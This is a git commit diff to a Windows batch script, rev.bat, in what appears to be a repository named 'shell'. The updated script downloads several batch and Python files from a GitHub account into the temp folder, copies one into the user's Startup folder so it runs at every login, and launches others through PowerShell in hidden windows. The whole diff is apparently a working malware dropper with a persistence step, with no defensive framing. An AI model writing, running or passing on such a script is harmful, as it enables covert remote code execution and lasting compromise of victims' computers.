021d3fc4289ebb8f8e968a9f1a5af95c1427f845
Omar Samy <osamy7592@gmail.com>
2024-05-07 04:56:00 +0300

    Update rev.bat

--- rev.bat
+++ rev.bat
@@ -1,11 +1,12 @@
+
 @echo off
-set "downloads_dir=%USERPROFILE%\Downloads"
-curl https://raw.githubusercontent.com/omarsamyX0/shell/main/pro.bat -o D:\pro.bat
+curl https://raw.githubusercontent.com/omarsamyX0/shell/main/pro.bat -o %temp%\pro.bat
 curl https://raw.githubusercontent.com/omarsamyX0/shell/main/sh.py -o %temp%\sh.py
-curl https://raw.githubusercontent.com/omarsamyX0/shell/main/vb.vbs -o D:\vb.vbs
-curl https://raw.githubusercontent.com/omarsamyX0/shell/main/vb1.vbs -o "%downloads_dir%\vb1.vbs"
-curl https://raw.githubusercontent.com/omarsamyX0/shell/main/post.bat -o "%downloads_dir%\post.bat"
-curl https://raw.githubusercontent.com/omarsamyX0/shell/main/post.vbs -o "%downloads_dir%\post.vbs"
-start /wait D:\vb.vbs
-call "%downloads_dir%\vb1.vbs"
+curl https://raw.githubusercontent.com/omarsamyX0/shell/main/vb.bat -o %temp%\vb.bat
+curl https://raw.githubusercontent.com/omarsamyX0/shell/main/vb1.bat -o "%temp%\vb1.bat"
+curl https://raw.githubusercontent.com/omarsamyX0/shell/main/nihbtdtdow.bat -o "%temp%\nihbtdtdow.bat"
+curl https://raw.githubusercontent.com/omarsamyX0/shell/main/start.bat -o "%temp%\start.bat"
+move "%temp%\start.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+powershell -c "Start-Process -FilePath "%temp%\vb.bat" -WindowStyle Hidden"
+powershell -c "Start-Process -FilePath "%temp%\vb1.bat" -WindowStyle Hidden"
 exit
